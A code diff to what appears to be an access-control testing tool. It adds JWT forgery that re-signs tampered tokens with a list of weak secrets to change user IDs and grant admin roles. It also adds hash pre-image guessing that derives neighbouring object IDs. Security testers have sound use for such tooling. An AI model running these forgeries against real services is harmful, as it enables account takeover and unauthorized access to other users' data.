@@ -16,10 +16,12 @@ from __future__ import annotations
 import base64
 import binascii
 import hashlib
+import hmac
 import logging
 import re
 import struct
 import time
+import urllib.parse as up
 import uuid
 from dataclasses import dataclass, field
 from typing import List, Optional, Tuple
@@ -153,6 +155,7 @@ def generate_candidates(
   id_type:      IDType,
   foreign_ids:  Optional[List[str]] = None,
   count:        int = 10,
+  url:          str = "",
 ) -> List[TamperCandidate]:
   """
   Generate tamper candidate values for `value` of `id_type`.
@@ -182,7 +185,7 @@ def generate_candidates(
     candidates.extend(_jwt_candidates(value))
 
   elif id_type in (IDType.HASH_MD5, IDType.HASH_SHA1, IDType.HASH_SHA256):
-    candidates.extend(_hash_candidates(value, id_type))
+    candidates.extend(_hash_candidates(value, id_type, url=url))
 
   elif id_type == IDType.HEX:
     candidates.extend(_hex_candidates(value, count))
@@ -459,11 +462,71 @@ def _jwt_candidates(value: str) -> List[TamperCandidate]:
       "JWT exp claim removed (empty sig)",
     ))
 
+  # 7. Weak HMAC secret brute-force — re-sign tampered payloads with common secrets.
+  #    Catches HS256 tokens signed with a known-weak or default key (e.g. "secret").
+  _WEAK_SECRETS: List[bytes] = [
+    b"secret", b"password", b"123456", b"changeme",
+    b"jwt_secret", b"supersecret", b"mysecretkey", b"test",
+    b"", b"key", b"s3cr3t", b"development",
+  ]
+
+  def _hs256(hdr_b64: str, pay_b64: str, key: bytes) -> str:
+    sig = hmac.new(key, f"{hdr_b64}.{pay_b64}".encode(), hashlib.sha256).digest()
+    return _b64_encode(sig)
+
+  alg = header.get('alg', '').upper()
+  if not alg or 'HS' in alg or alg == 'NONE':
+    for _secret in _WEAK_SECRETS:
+      # Identity-claim mutations re-signed with this secret
+      for key in id_claim_keys:
+        if key in payload:
+          orig = payload[key]
+          mutations: list = []
+          if isinstance(orig, int):
+            mutations = [orig + 1, 1]
+          elif isinstance(orig, str) and orig.isdigit():
+            mutations = [str(int(orig) + 1), "1"]
+          for mut in mutations[:2]:
+            new_payload = dict(payload)
+            new_payload[key] = mut
+            new_p = _b64_encode(_json.dumps(new_payload, separators=(',', ':')).encode())
+            try:
+              results.append(TamperCandidate(
+                f"{parts[0]}.{new_p}.{_hs256(parts[0], new_p, _secret)}",
+                f"JWT re-signed secret={_secret!r}, {key}={orig}→{mut}",
+              ))
+            except Exception:
+              pass
+          break  # one claim at a time
+
+      # Role escalation re-signed with this secret
+      for role_key in ['role', 'roles', 'is_admin', 'admin', 'scope']:
+        if role_key in payload:
+          new_payload = dict(payload)
+          orig_role = payload[role_key]
+          if isinstance(orig_role, bool):
+            new_payload[role_key] = True
+          elif isinstance(orig_role, str):
+            new_payload[role_key] = 'admin'
+          elif isinstance(orig_role, list):
+            new_payload[role_key] = orig_role + ['admin']
+          else:
+            break
+          new_p = _b64_encode(_json.dumps(new_payload, separators=(',', ':')).encode())
+          try:
+            results.append(TamperCandidate(
+              f"{parts[0]}.{new_p}.{_hs256(parts[0], new_p, _secret)}",
+              f"JWT re-signed secret={_secret!r}, {role_key}=admin",
+            ))
+          except Exception:
+            pass
+          break
+
   return results
 
 
-def _hash_candidates(value: str, id_type: IDType) -> List[TamperCandidate]:
-  """Try to reverse common integer IDs by hashing a range."""
+def _hash_candidates(value: str, id_type: IDType, url: str = "") -> List[TamperCandidate]:
+  """Try to reverse integer and compound pre-images by hashing candidates."""
   results = []
   fn = {
     IDType.HASH_MD5:    lambda s: hashlib.md5(s).hexdigest(),
@@ -474,20 +537,46 @@ def _hash_candidates(value: str, id_type: IDType) -> List[TamperCandidate]:
   if fn is None:
     return results
 
-  # Try hashes of common small integers
-  for n in range(0, 200):
-    candidate = fn(str(n).encode())
-    if candidate.lower() == value.lower():
-      # We found the pre-image — generate neighbours
-      for delta in [1, 2, -1, 3, -2]:
-        neighbour = fn(str(n + delta).encode())
-        results.append(TamperCandidate(
-          neighbour,
-          f"hash({n + delta}) [pre-image of original was {n}]",
-        ))
+  def _emit_neighbours(prefix: str, n: int, sep: str) -> None:
+    for delta in [1, 2, -1, 3, -2]:
+      m = n + delta
+      if m >= 0:
+        label = f"{prefix}{sep}{m}" if prefix else str(m)
+        results.append(TamperCandidate(fn(label.encode()), f"hash({label!r})"))
+
+  # 1. Bare integer pre-image search (0..399)
+  found = False
+  for n in range(0, 400):
+    if fn(str(n).encode()).lower() == value.lower():
+      _emit_neighbours("", n, "")
+      found = True
       break
 
-  # Also try hashing "admin", "1", "0"
+  # 2. Compound pre-image: URL path segments used as prefixes.
+  #    Catches patterns like md5("file-101"), sha1("user:42"), etc.
+  if not found and url:
+    path_segs = [
+      s for s in up.urlparse(url).path.split('/')
+      if s and not re.fullmatch(r'[0-9a-f]{8,}', s, re.I)
+    ]
+    prefixes: List[str] = []
+    for seg in path_segs:
+      prefixes.append(seg)
+      if seg.endswith('s') and len(seg) > 3:
+        prefixes.append(seg[:-1])   # singular: "files" → "file"
+    for prefix in dict.fromkeys(prefixes):
+      if found:
+        break
+      for n in range(0, 400):
+        for sep in ('-', ':', ''):
+          if fn(f"{prefix}{sep}{n}".encode()).lower() == value.lower():
+            _emit_neighbours(prefix, n, sep)
+            found = True
+            break
+        if found:
+          break
+
+  # 3. Fixed seeds always included
   for seed in ["admin", "root", "0", "1"]:
     results.append(TamperCandidate(fn(seed.encode()), f"hash({seed!r})"))
 
